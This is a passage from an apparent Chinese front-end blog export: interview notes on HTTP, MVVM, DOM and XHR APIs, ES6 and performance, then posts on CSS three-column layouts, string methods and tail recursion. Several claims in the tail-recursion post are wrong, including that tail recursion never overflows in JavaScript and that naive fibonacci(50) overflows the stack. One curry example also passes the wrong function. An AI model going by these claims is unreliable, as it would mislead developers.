409——对当前资源状态，请求不能完成 410——服务器上不再有此资源且无进一步的参考地址 411——服务器拒绝用户定义的Content-Length属性请求 412——一个或多个请求头字段在当前请求中错误 413——请求的资源大于服务器允许的大小 414——请求的资源URL长于服务器允许的长度 415——请求资源不支持请求项目格式 416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段 417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。 (服务端错误类)：服务器不能正确执行一个正确的请求 HTTP 500 - 服务器遇到错误，无法完成请求 - HTTP 500.100 - 内部服务器错误 - ASP 错误 - HTTP 500-11 服务器关闭 - HTTP 500-12 应用程序重新启动 - HTTP 500-13 - 服务器太忙 - HTTP 500-14 - 应用程序无效 - HTTP 500-15 - 不允许请求 global.asa - Error 501 - 未实现 HTTP 502 - 网关错误 HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常101——客户要求服务器根据请求转换HTTP协议版本 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？（流程说的越详细越好）详细版： 浏览器会开启一个线程来处理这个请求，对 URL 分析判断如果是 http 协议就按照 Web 方式来处理; 调用浏览器内核中的对应方法，比如 WebView 中的 loadUrl 方法; 通过DNS解析获取网址的IP地址，设置 UA 等信息发出第二个GET请求; 进行HTTP协议会话，客户端发送报头(请求报头); 进入到web服务器上的 Web Server，如 Apache、Tomcat、Node.JS 等服务器; 进入部署好的后端应用，如 PHP、Java、JavaScript、Python 等，找到对应的请求处理; 处理结束回馈报头，此处如果浏览器访问过，缓存上有对应资源，会与服务器最后修改时间对比，一致则返回304; 浏览器开始下载html文档(响应报头，状态码200)，同时使用缓存; 文档树建立，根据标记请求所需指定MIME类型的文件（比如css、js）,同时设置了cookie; 页面开始渲染DOM，JS根据DOM API操作DOM,执行事件绑定等，页面显示完成。 简洁版： 浏览器根据请求的URL交给DNS域名解析，找到真实IP，向服务器发起请求； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。 什么是持久连接？HTTP协议采用“请求-应答”模式，当使用普通模式，即非keep-alive模式时，每个请求和服务器都要新建一个链接，完成后立即断开连接（HTTP协议为无连接的协议） 当使用keep-alive模式（又称持久连接、连接重用）时，keep-alive功能是客户端到服务器端的连接持续有效，当出校对服务器的后继请求时，keep-alive功能避免了建立或者重新建立连接 什么是管线化？在使用持久连接的情况下，某个链接上消息的传递类似于请求1 -&gt; x响应1 -&gt; 请求2 -&gt; 响应2 管线化，在持久连接的基础上，类似于请求1 -&gt; 请求2 -&gt; 响应1 -&gt; 响应2 管线化特点： 管线化机制通过持久化完成，仅HTTP/1.1支持 只有GET和HEAD请求可以进行管线化，而POST有所限制 管线化不会影响响应到来的顺序 服务器端支持管线化，并不要求服务器端也对响应进行管线化处理，只是要求对于管线化的请求不失败 HTTP/1.1与HTTP/2.0的区别 多路复用 HTTP/2.0使用多路复用技术，使用同一个TCP连接来处理多个请求。 首部压缩 HTTP/1.1的首部带有大量信息，而且每次都要重复发送。HTTP/2.0要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。 服务端推送 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求index.html页面，服务端就把index.js一起发送给客户端。 二进制格式 HTTP/1.1的解析基于文本的，而HTTP/2.0采用二级制格式。 React和Vue相似之处和不同之处？React和Vue相似之处： 使用Virtual DOM 提供了响应式（Reactive）和组件化（Composable）的视图组件 将注意力集中保持在和核心库，而将其他功能如路由和全局状态交给相关的库 不同之处： React有更丰富的生态系统 React在某个组件状态发生变化时，它会以该组件为根，重新渲染整个组件子树，而Vue自动追踪，精确知晓哪个组件需要被重渲染 React渲染功能依靠JSX，支持类型检查、编译器自动完成，linting，Vue默认推荐的还是模板 CSS作用域在React中是通过CSS-in-JS方案实现，Vue设置样式的默认方法时单文件组件里类似style的标签 编写有本地渲染能力的APP，React有React Native，比较成熟。Vue有Weex，还在快速发展中 对MVVM的认识？ 先聊一下MVC MVC：Model（模型） View（视图） Controller（控制器），主要是基于分层的目的，让彼此的职责分开。 View通过Controller和Model联系，Controller是View和Model的协调者，view和Model不直接联系，基本联系都是单向的。 顺带提下MVP MVP：是从MVC模式演变而来的，都是通过Controller/Presenter负责逻辑的处理+Model提供数据+View负责显示。 在MVP中，Presenter完全把View和Model进行分离，主要的程序逻辑在Presenter里实现。并且，Presenter和View是没有直接关联的，是通过定义好的接口进行交互，从而使得在变更View的时候可以保持Presenter不变。这样可以在没有view层就可以单元测试。 再聊聊MVVN MVVM：Model + View + ViewModel，把MVC中的Controller和MVP中的Presenter改成ViewModel view的变化会自动更新到ViewModel，ViewModel的变化也会自动同步到View上显示。这种自动同步是因为ViewModel中的属性实现了Observer，当属性变更时都能触发对应操作。 View 是HTML文本的js模板； ViewModel是业务逻辑层（一切js可视业务逻辑，比如表单按钮提交，自定义事件的注册和处理逻辑都在viewmodel里面负责监控两边的数据）； Model数据层，对数据的处理（与后台数据交互的增删改查） 提一下我熟悉的MVVM框架：vue.js，Vue.js是一个构建数据驱动的 web 界面的渐进式框架。Vue.js 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。核心是一个响应的数据绑定系统。 一句话总结下不同之处 MVC中联系是单向的，MVP中P和V通过接口交互，MVVM的联系是双向的 DOM元素e的e.getAttribute(propName)和e.propName有什么区别和联系？ e.getAttribute()，是标准DOM操作文档元素属性的方法，具有通用性可在任意文档上使用，返回元素在源文件中设置的属性； e.propName通常是在HTML文档中访问特定元素的特性，浏览器解析元素后生成对应对象（如a标签生成HTMLAnchorElement），这些对象的特性会根据特定规则结合属性设置得到，对于没有对应特性的属性，只能使用getAttribute进行访问； 一些attribute和property不是一一对应如：form控件中对应的是defaultValue，修改或设置value property修改的是控件当前值，setAttribute修改value属性不会改变value property； offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别？ offsetWidth/offsetHeight返回值包含content + padding + border，效果与e.getBoundingClientRect()相同 clientWidth/clientHeight返回值只包含content + padding，如果有滚动条，也不包含滚动条 scrollWidth/scrollHeight返回值包含content + padding + 溢出内容的尺寸 XMLHttpRequest通用属性和方法 readyState:表示请求状态的整数，取值： UNSENT（0）：对象已创建 OPENED（1）：open()成功调用，在这个状态下，可以为xhr设置请求头，或者使用send()发送请求 HEADERS_RECEIVED(2)：所有重定向已经自动完成访问，并且最终响应的HTTP头已经收到 LOADING(3)：响应体正在接收 DONE(4)：数据传输完成或者传输产生错误 onreadystatechange：readyState改变时调用的函数 status：服务器返回的HTTP状态码（如，200， 404） statusText:服务器返回的HTTP状态信息（如，OK，No Content） responseText:作为字符串形式的来自服务器的完整响应 responseXML: Document对象，表示服务器的响应解析成的XML文档 abort():取消异步HTTP请求 getAllResponseHeaders(): 返回一个字符串，包含响应中服务器发送的全部HTTP报头。每个报头都是一个用冒号分隔开的名/值对，并且使用一个回车/换行来分隔报头行 getResponseHeader(headerName):返回headName对应的报头值 open(method, url, asynchronous [, user, password]):初始化准备发送到服务器上的请求。method是HTTP方法，不区分大小写；url是请求发送的相对或绝对URL；asynchronous表示请求是否异步；user和password提供身份验证 setRequestHeader(name, value):设置HTTP报头 send(body):对服务器请求进行初始化。参数body包含请求的主体部分，对于POST请求为键值对字符串；对于GET请求，为null focus/blur与focusin/focusout的区别和联系 focus/blur不冒泡，focusin/focusout冒泡； focus/blur兼容好，focusin/focusout在除FireFox外的浏览器下都保持良好兼容性； 可获得焦点的元素： window 链接被点击或键盘操作 表单空间被点击或键盘操作 设置tabindex属性的元素被点击或键盘操作 mouseover/mouseout与mouseenter/mouseleave的区别与联系？ mouseover/mouseout是冒泡事件；mouseenter/mouseleave不冒泡。需要为多个元素监听鼠标移入/出事件时，推荐mouseover/mouseout托管，提高性能 函数内部arguments变量有哪些特性,有哪些属性,如何将它转换为数组 arguments所有函数中都包含的一个局部变量，是一个类数组对象，对应函数调用时的实参。如果函数定义同名参数会在调用时覆盖默认对象 arguments[index]分别对应函数调用时的实参，并且通过arguments修改实参时会同时修改实参 arguments.length为实参的个数（Function.length表示形参长度） arguments.callee为当前正在执行的函数本身，使用这个属性进行递归调用时需注意this的变化 arguments.caller为调用当前函数的函数（已被遗弃） 转换为数组：var args = Array.prototype.slice.call(arguments, 0); 解释原型继承的工作原理所有的js对象都有一个prototype属性，指向它的原型对象。当试图访问一个对象，如果在该对象上没有找到，它还会搜寻该对象的原型，以及该对象的原型的原型，依次向上搜索，直到找到一个名称匹配的属性或到达原型链的末尾。 你觉得jQuery源码有哪些写的好的地方？ jquery源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入undefined参数，可以缩短查找undefined时的作用域链 jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了jquery.fn，这是很形象的写法 有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度 jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率 ES6相对ES5有哪些新特性？123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990新增let、const命令声明变量变量的解构赋值 |--数组的解构 |--对象的解构 |--字符串的解构 |--数值、布尔值的解构 |--函数参数的解构正则表达式的扩展 |--允许 new RegExp(/abc/, &apos;i&apos;) |--match()、replace()、search()和split()添加到RegExp实例方法 |--u修饰符，正确匹配四字节，UTF-16编码 |--y修饰符，从第一个位置开始匹配 |--sticky属性，表示是否设置了y修饰符 |--flags属性，返回正则修饰符 |--s修饰符，是.可以匹配任意单个字符 |--dotAll属性，表示是否设置了s修饰符 |--后行断言，/(?&lt;=y)x/，x在y的后面才匹配数值的扩展 |--二进制（0b或0B）和八进制（0o或0O） |--Number.isFinite()，Number.isNaN |--Number.parseInt()，Number.parseFloat() |--Number.isInteger() |--Number.EPSION |--Number.isSafeInteger() |--指数运算符（**）函数的扩展 |--函数默认值 |--rest参数 |--严格模式，不允许使用默认值、解构赋值、或者扩展运算符 |--name属性，构造函数name为anonymous，函数bind作用域后，name为bound name |--箭头函数 |--双冒号运算符，箭头函数可以绑定this对象 |--尾调用优化 |--函数参数的尾逗号数组的扩展 |--[...likeArr]扩展运算符 |--Array.from() |--Array.of() |--数组实例的copyWithin() |--数组实例的find()和findIndex() |--数组实例的fill() |--数组实例的entries()，keys()和values() |--数组实例的includes() |--数组的空位对象的扩展 |--属性的简洁表示法 &#123;foo&#125;表示&#123;foo:foo&#125; |--属性名表达式 &#123;[propKey]: true&#125; |--Object.is()解决 NaN!==NaN 和 +0===-0 问题 |--Object.assign() |--属性的遍历 |--Object.setPropertyOf()、Object.getPropertyOf() |--super关键字，指向对象的原型 |--Object.keys()、Object.values()、Object.entries() |--解构赋值 |--扩展运算符新增一种数据类型 Symbol |--遍历Object.getOwnPropertySymbols() |--Symbol.for()、Symbol.keyFor()Set和Map数据解构ProxyReflectPromise对象 |--Promise.prototype.then() |--Promise.prototype.catch() |--Promise.prototype.finally() |--Promise.all() |--Promise.race() |--Promise.resolve() |--Promise.reject()Iterator和for...of循环GeneratorasyncClassDecorator 提升页面性能的方法有哪些？ 资源压缩合并，减少HTTP请求 非核心代码异步加载 追问：异步加载的方式？ （1）动态脚本加载（2）defer（3）async 追问：异步加载的区别？ （1）defer是在HTML解析完后才执行，如果是多个，按照执行加载顺序依次执行（2）async是在加载完之后立即执行，如果是多个，执行顺序和加载顺序无关。 利用浏览器缓存 追问：缓存的分类，缓存的原理？ 强缓存：不询问服务器直接用 服务器响应头 Expires Expires: Thu,21 Jan… 这是个绝对时间，由于服务器和客户端有时差，后来在HTTP/1.1中就改成了Cache-Control。 Cache-Control Cache-Control:max-age=3600 这个是时长，从当前时间起缓存时长。 协商缓存：询问服务器当前缓存是否过期 服务器下发Last-Modified 浏览器请求If-Modifield-Since Thu,21 Jan... 修改时间 服务器下发Etag 浏览器请求If-None-Match 资源是否被改动过 使用CDN 预解析DNS &lt;a&gt;标签浏览器默认模式是预解析的，但是对于https是关闭的，需要在header中添加12&lt;meta http-equip="x-dns-prefetch-control" content="on"&gt;&lt;link rel="dns-prefetch" href="//host_name_to_prefetch.com"&gt; 开启DNS预解析 错误监控 前端错误分类：（1）及时运行错误（2）资源加载错误 及时运行错误的捕获方式：（1）try..catch（2）window.onerror 资源加载错误： （1）object.onerror （2）performance.getEntries() 获取成功加载资源的api，对比一下现有资源，就可以知道失败加载的资源。 （3）Error事件捕获 ps:资源加载错误不会冒泡到`body`上，但是捕获事件可以 123window.addEventListener('error', function(e) &#123; console.log(e);&#125;, true) 拓展：跨域错误可以捕获到吗？怎么处理错误？ 属于资源加载错误，可以被捕获到。处理：在客户端，script标签增加crossorigin属性，服务端增加HTTP响应头增加Access-Control-Allow-Origin:*/ 上报错误的基本原理 用Ajax通信上报 用Image对象上报 1(new Image()).src = 'http://xxx.com/posterror?error=xxx']]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript思维导图]]></title>
    <url>%2F2018%2F08%2F27%2FJavaScript%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[《JavaScript高级程序》已过一遍，梳理js基础知识点，思维导图是极有帮助的，搜了一下，还真有整理得很全的，收藏一波。 1. 变量 2. 数组 3. 运算符 4. 流程语句 5. 字符串函数 6. DOM操作 7. BOM操作 8. window对象 9. 函数 10. 正则表达式 11. DOM对象]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区分substring、substr和slice]]></title>
    <url>%2F2018%2F08%2F27%2F%E5%8C%BA%E5%88%86substring%E3%80%81substr%E5%92%8Cslice%2F</url>
    <content type="text"><![CDATA[参数为正数的情况slice()和substring()的第二个参数指定的是字符串最后一个字符后面的位置，而substr()的第二个擦输指定的则是返回的字符串个数。 12345678var stringValue = &quot;hello world&quot;;console.log(stringValue.slice(3)); // &quot;lo world&quot;console.log(stringValue.substring(3)); // &quot;lo world&quot;console.log(stringValue.substr(3)); // &quot;lo world&quot;console.log(stringValue.slice(3, 7)); // &quot;lo w&quot;console.log(stringValue.substring(3, 7)); // &quot;lo w&quot;console.log(stringValue.substr(3, 7)); // &quot;lo worl&quot; 参数有负数的情况slice()方法会将传入的负数与字符串的长度相加，substr()方法将负的第一个参数加上字符串的长度，而将负的第二个参数转化为0。最后，substring()方法会把所有负值参数都转化为0。 12345678var stringValue = &quot;hello world&quot;;console.log(stringValue.slice( -3 )); // &quot;rld&quot;console.log(stringValue.substring( -3 )); // &quot;hellow world&quot;console.log(stringValue.substr( -3 )); // &quot;rld&quot;console.log(stringValue.slice( 3, -4 )); // &quot;lo w&quot;console.log(stringValue.substring( 3, -4 )); // &quot;hel&quot;console.log(stringValue.substr( 3, -4 )); // &quot;&quot;]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搞定css三列布局]]></title>
    <url>%2F2018%2F08%2F27%2F%E6%90%9E%E5%AE%9Acss%E4%B8%89%E5%88%97%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[谈到布局，首先就要想到定位，当别人问我，css的position定位有哪些取值，分别表示什么意思？呃….. 定位position有六个属性值：static、relative、absolute、fixed、sticky和inherit。 static（默认）：元素框正常生成。块级元素生成一个矩形框，作为文档流的一部分；行内元素则会创建一个或多个行框，置于父级元素中。 relative：元素框相对于之前正常文档流中的位置发生偏移，并且原先的位置仍然被占据。发生偏移的时候，可能会覆盖其他元素。 absolute：元素框不再占有文档位置，并且相对于包含块进行偏移（所谓包含块就是最近一级外层元素position不为static的元素）。 fixed：元素框不再占有文档流位置，并且相对于视窗进行定位。 sticky：css3新增属性值，粘性定位，相当于relative和fixed的混合。最初会被当作是relative，相对原来位置进行偏移；一旦超过一定的阈值，会被当成fixed定位，相对于视口定位。 三列布局三列布局，其中一列宽度自适应，在PC端最常用之一，搞定了三列布局，其他一样的套路。 方式一：浮动布局缺点：html结构不正确,当包含区域宽度小于左右框之和，右边框会被挤下来 1234567891011121314151617181920212223242526272829303132&lt;style&gt; .tree-columns-layout.float .left &#123; float: left; width: 300px; background-color: #a00; &#125; .tree-columns-layout.float .right &#123; float: right; width: 300px; background-color: #0aa; &#125; .tree-columns-layout.float .center &#123; /* left: 300px; right: 300px; */ margin: 0 300px; background-color: #aa0; overflow: auto; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout float&quot;&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是浮动布局左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是浮动布局右框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;center&quot;&gt; &lt;h1&gt;我是浮动布局中间框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; 方式二：定位布局缺点：要求父级要有非static定位，如果没有，左右框容易偏移出去 1234567891011121314151617181920212223242526272829303132333435363738&lt;style&gt; .tree-columns-layout.position &#123; position: relative; &#125; .tree-columns-layout.position .left &#123; position: absolute; left: 0; top: 0; width: 300px; background-color: #a00; &#125; .tree-columns-layout.position .right &#123; position: absolute; right: 0; top: 0; width: 300px; background-color: #0aa; &#125; .tree-columns-layout.position .center &#123; margin: 0 300px; background-color: #aa0; overflow: auto; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout position&quot;&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是浮动定位左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;center&quot;&gt; &lt;h1&gt;我是浮动定位中间框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是浮动定位右框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; 方式三：表格布局缺点：没什么缺点，恐惧table 123456789101112131415161718192021222324252627282930313233343536&lt;style&gt; .tree-columns-layout.table &#123; display: table; width: 100%; &#125; .tree-columns-layout.table &gt; article &#123; display: table-cell; &#125; .tree-columns-layout.table .left &#123; width: 300px; background-color: #a00; &#125; .tree-columns-layout.table .center &#123; background-color: #aa0; &#125; .tree-columns-layout.table .right &#123; width: 300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout table&quot;&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是表格布局左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;center&quot;&gt; &lt;h1&gt;我是表格布局中间框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是表格布局右框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; 方式四：flex弹性布局缺点：兼容性 123456789101112131415161718192021222324252627282930313233&lt;style&gt; .tree-columns-layout.flex &#123; display: flex; &#125; .tree-columns-layout.flex .left &#123; width: 300px; flex-shrink: 0; /* 不缩小 */ background-color: #a00; &#125; .tree-columns-layout.flex .center &#123; flex-grow: 1; /* 增大 */ background-color: #aa0; &#125; .tree-columns-layout.flex .right &#123; flex-shrink: 0; /* 不缩小 */ width: 300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout flex&quot;&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是flex弹性布局左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;center&quot;&gt; &lt;h1&gt;我是flex弹性布局中间框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是flex弹性布局右框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; 方式五：grid栅格布局缺点：兼容性 Firefox 52, Safari 10.1, Chrome 57, Opera 44 1234567891011121314151617181920212223242526272829&lt;style&gt; .tree-columns-layout.grid &#123; display: grid; grid-template-columns: 300px 1fr 300px; &#125; .tree-columns-layout.grid .left &#123; background-color: #a00; &#125; .tree-columns-layout.grid .center &#123; background-color: #aa0; &#125; .tree-columns-layout.grid .right &#123; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout grid&quot;&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是grid栅格布局左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;center&quot;&gt; &lt;h1&gt;我是grid栅格布局中间框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是grid栅格布局右框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; 方式六：圣杯布局缺点：需要多加一层标签，html顺序不对，占用了布局框的margin属性 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;style&gt; .tree-columns-layout.cup:after &#123; clear: both; content: &quot;&quot;; display: table; &#125; .tree-columns-layout.cup .center &#123; width: 100%; float: left; &#125; .tree-columns-layout.cup .center &gt; div &#123; margin: 0 300px; overflow: auto; background-color: #aa0; &#125; .tree-columns-layout.cup .left &#123; width: 300px; float: left; margin-left: -100%; background-color: #a00; &#125; .tree-columns-layout.cup .right &#123; width: 300px; float: left; margin-left: -300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class=&quot;tree-columns-layout cup&quot;&gt; &lt;article class=&quot;center&quot;&gt; &lt;div&gt; &lt;h1&gt;我是圣杯布局中间框&lt;/h1&gt; &lt;/div&gt; &lt;/article&gt; &lt;article class=&quot;left&quot;&gt; &lt;h1&gt;我是圣杯布局左框&lt;/h1&gt; &lt;/article&gt; &lt;article class=&quot;right&quot;&gt; &lt;h1&gt;我是圣杯布局右框&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对MVC、MVP和MVVM的简单认识]]></title>
    <url>%2F2018%2F08%2F27%2F%E5%AF%B9MVC%E3%80%81MVP%E5%92%8CMVVM%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%A4%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1. 先聊一下MVCMVC：Model（模型） View（视图） Controller（控制器），主要是基于分层的目的，让彼此的职责分开。 View通过Controller和Model联系，Controller是View和Model的协调者，view和Model不直接联系，基本联系都是单向的。 2. 顺带提下MVPMVP：是从MVC模式演变而来的，都是通过Controller/Presenter负责逻辑的处理+Model提供数据+View负责显示。 在MVP中，Presenter完全把View和Model进行分离，主要的程序逻辑在Presenter里实现。并且，Presenter和View是没有直接关联的，是通过定义好的接口进行交互，从而使得在变更View的时候可以保持Presenter不变。 3. 再聊聊MVVNMVVM：Model + View + ViewModel，把MVC中的Controller和MVP中的Presenter改成ViewModel view的变化会自动更新到ViewModel，ViewModel的变化也会自动同步到View上显示。这种自动同步是因为ViewModel中的属性实现了Observer，当属性变更时都能触发对应操作。 View 是HTML文本的js模板； ViewModel是业务逻辑层（一切js可视业务逻辑，比如表单按钮提交，自定义事件的注册和处理逻辑都在viewmodel里面负责监控俩边的数据）； Model数据层，对数据的处理（与后台数据交互的增删改查） 提一下我熟悉的MVVM框架：vue.js，Vue.js是一个构建数据驱动的 web 界面的渐进式框架。Vue.js 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。核心是一个响应的数据绑定系统。 4. 一句话总结下不同之处MVC中联系是单向的，MVP中P和V通过接口交互，MVVP的联系是双向的]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尾调用]]></title>
    <url>%2F2018%2F08%2F27%2F%E5%B0%BE%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[前言面某东，有一道题目是 实现一个斐波拉契数列， 已知第一项为0，第二项为1，第三项为1，后一项是前两项之和，即f(n) = f(n - 1) + f(n -2)。 拿到这个题目，二话没想就写了 12345function f(n) &#123; if(n === 0) return 0; if(n === 1) return 1; return f(n - 1) + f(n -2);&#125; 后来回想，后悔死了，这明显没这么简单，每次递归调用都会呈指数往调用栈里增加记录“调用帧“，这样做，当项比较多，就会出现“栈溢出”的！！！也就是，这个答案是不及格的，正确姿势应该用尾递归优化，”调用帧“保持只有一个。正解也就是： 123456function f(n, prev, next) &#123; if(n &lt;= 1) &#123; return next; &#125; return f(n - 1, next, prev + next);&#125; 下面来复习一下知识点：尾调用和尾递归。PS：更好的方案请继续往下看。 尾调用尾调用是指某个函数的最后一步是调用另一个函数。 以下三种情况都不是尾调用： 123456789101112131415// 情况一function f(x) &#123; let y = g(x); return y;&#125;// 情况二function f(x) &#123; return g(x) + 1;&#125;// 情况三function f(x) &#123; g(x);&#125; 情况一是调用函数g之后，还有赋值操作，所以不属于尾调用，即使语义完全一样。情况二也是属于调用后还有操作。情况三等同于： 12g(x);return undefined; 函数调用会在内存形成一个“调用记录”，又称“调用帧”，保存调用位置和内存变量等信息。如果在函数A的内部调用函数B，那么在A的调用帧上方，还会形成一个B的调用帧。等到B运行结束，将结果返回到A，B的调用帧才会消失。如果函数B内部还调用函数C，那就还有一个C的调用帧，依次类推。所有的调用帧，就形成一个“调用栈”。 尾调用由于是函数的最后一步操作，所有不需要保留外层函数的调用帧，因为调用位置、内部变量等信息都不会再用到了，只要直接用内层函数的调用帧，取代外层函数的调用帧就可以了。 123456789101112131415function f() &#123; let m = 0; let n = 2; return g(m + n);&#125;f();// 等同于function f() &#123; return g(3);&#125;f();// 等同于g(3); 如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”。 注意，只有不再用到外层函数的内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则就无法进行“尾调用优化”。 1234567function addOne(a) &#123; var one = 1; function inner(b) &#123; return b + one; &#125; return inner(a);&#125; 尾递归函数调用自身，称为递归。如果尾调用自身，就称为尾递归。递归非常耗费内存，因为需要同时保存成百上千调用帧，很容易发生“栈溢出”错误。但对于尾递归来说，由于只存在一个调用帧，所以永远不会发生“栈溢出”错误。 12345function factorial(n) &#123; if (n === 1) return 1; return n * factorial(n - 1);&#125;console.log(factorial(5)); // 120 上面最多保存n个调用记录，复杂度是O(n)。 如果改成尾递归，只保留一个调用记录，复杂度O(1)。 12345function factorial(n, total) &#123; if (n === 0) return total; return factorial(n - 1, n * total);&#125;console.log(factorial(5, 1)); // 120 下面回到我们的主题，计算Fibonacci数列。 123456function fibonacci(n) &#123; if(n &lt;= 1) return 1; return fibonacci(n -1) + fibonacci(n -2);&#125;console.log(fibonacci(10)); // 89console.log(fibonacci(50)); // stack overflow 上面不使用尾递归，项数稍大点就发生”栈溢出“了。 1234567function fibonacci(n, prev, next) &#123; if(n &lt;= 1) return next; return fibonacci(n-1, next, prev + next);&#125;console.log(fibonacci(10, 1, 1)); // 89console.log(fibonacci(100, 1, 1)); // 573147844013817200000console.log(fibonacci(1000, 1, 1)); // 7.0330367711422765e+208 上面项数再大都状态良好。 柯理化改写尾递归的实现，往往需要改写递归函数，确保最后一步只调用自身。做到这一点的方法，就是把所有用到的内部变量改写成函数的参数。但是这样的话就会增加初始入参，比如fibonacci(10, 1, 1)，后面的两个参数1和1意思不明确，直接用fibonacci(100)才是习惯用法。所以需要在中间预先设置好初始入参，将多个入参转化成单个入参的形式，叫做函数柯理化。通用方式为： 12345678function curry(fn) &#123; var args = Array.prototype.slice.call(arguments, 1); return function () &#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = innerArgs.concat(args); return fn.apply(null, finalArgs); &#125;&#125; 用函数柯理化改写阶乘 1234567function tailFactorial(n, total) &#123; if(n === 1) return total; return tailFactorial(n - 1, n * total);&#125;var factorial = curry(tailFactorial, 1);console.log(factorial(5)); // 120 同样改写斐波拉契数列 123456789function tailFibonacci(n, prev, next) &#123; if(n &lt;= 1) return next; return tailFibonacci(n - 1, next, prev + next);&#125;var fibonacci = curry(fibonacci, 1, 1);console.log(fibonacci(10)); // 89console.log(fibonacci(100)); // 573147844013817200000console.log(fibonacci(1000)); // 7.0330367711422765e+208 ES6改写柯理化的过程其实是初始化一些参数的过程，在ES6中，是可以直接函数参数默认赋值的。 用ES6改写阶乘 12345const factorial = (n, total = 1) =&gt; &#123; if(n === 1) return total; return factorial(n - 1, n * total);&#125;console.log(factorial(5)); // 120 用ES6改写斐波拉契数列 1234567const fibonacci = (n, prev = 1, next = 1) =&gt; &#123; if(n &lt;= 1) return next; return fibonacci(n - 1, next, prev + next);&#125;console.log(fibonacci(10)); // 89console.log(fibonacci(100)); // 573147844013817200000console.log(fibonacci(1000)); // 7.0330367711422765e+208 ps：用ES6极大方便了算法运用！ 总结综上，这个问题解决的思路是： 尾递归+函数柯理化； 尾递归+ES6默认赋值； 算法题永远要想到性能问题，不能只停留到表面，默哀三秒钟，[悲伤脸.gif]。]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原生富文本编辑器]]></title>
    <url>%2F2018%2F08%2F27%2F%E5%8E%9F%E7%94%9F%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
